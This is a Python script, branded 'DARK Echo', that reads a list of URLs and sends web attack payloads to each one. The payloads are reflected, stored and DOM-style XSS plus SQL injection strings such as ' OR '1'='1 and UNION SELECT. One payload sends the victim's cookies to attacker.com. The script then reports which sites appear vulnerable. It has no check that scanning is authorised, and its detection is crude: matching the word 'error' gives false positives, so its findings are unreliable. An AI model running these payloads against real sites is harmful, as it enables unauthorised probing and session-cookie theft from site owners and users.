import requests
from pyfiglet import Figlet
from tabulate import tabulate
from colorama import Fore, Style, init

# Initialize colorama
init()

# Display banner
def display_banner():
    f = Figlet(font='slant')
    print(Fore.GREEN + f.renderText('DARK Echo') + Style.RESET_ALL)

# Check XSS vulnerability with various payloads
def check_xss(url):
    payloads = {
        'Reflected XSS': [
            "<script>alert('Reflected XSS')</script>",
            "<img src='x' onerror='alert(1)'>",
            "<a onmouseover='alert(1)'>test</a>"
        ],
        'Stored XSS': [
            "<script>alert('Stored XSS')</script>",
            "<img src='x' onerror='alert(2)'>",
            "<a onmouseover='alert(2)'>test</a>"
        ],
        'DOM-based XSS': [
            "<script>document.location='http://attacker.com?cookie='+document.cookie</script>",
            "<script>console.log(document.domain)</script>"
        ]
    }
    
    results = []
    for xss_type, payload_list in payloads.items():
        for payload in payload_list:
            try:
                response = requests.get(url, params={'test': payload})
                if payload in response.text:
                    results.append(xss_type)
                    break
            except requests.RequestException:
                continue
    
    return results

# Check SQL Injection vulnerability
def check_sql_injection(url):
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL, NULL--",
        '" OR 1=1--'
    ]
    for payload in payloads:
        try:
            response = requests.get(url, params={'test': payload})
            if 'SQL' in response.text or 'error' in response.text:
                return 'SQL Injection'
        except requests.RequestException:
            continue
    return None

# Check for different types of vulnerabilities
def check_vulnerabilities(url):
    vulnerabilities = []
    xss_vulnerabilities = check_xss(url)
    if xss_vulnerabilities:
        vulnerabilities.extend(xss_vulnerabilities)
    sql_injection = check_sql_injection(url)
    if sql_injection:
        vulnerabilities.append(sql_injection)
    return vulnerabilities

# Main function
def main():
    display_banner()
    
    # Input file with list of websites
    input_file = input("Enter the path to the file containing URLs: ")
    
    results = []
    
    try:
        with open(input_file, 'r') as file:
            urls = file.readlines()
            
            for url in urls:
                url = url.strip()
                if not url:
                    continue
                print(f"Scanning: {url}")
                vulnerabilities = check_vulnerabilities(url)
                
                if vulnerabilities:
                    # Create a result row with green color for vulnerabilities
                    row = [Fore.GREEN + url + Style.RESET_ALL]
                    row.append(', '.join(vulnerabilities))
                    results.append(row)
                
    except FileNotFoundError:
        print(Fore.RED + "File not found. Please check the file path." + Style.RESET_ALL)
        return
    
    # Display results in table format
    if results:
        headers = ['URL', 'Vulnerabilities']
        print(tabulate(results, headers=headers, tablefmt='grid'))
    else:
        print(Fore.YELLOW + "No vulnerabilities found in the scanned URLs." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
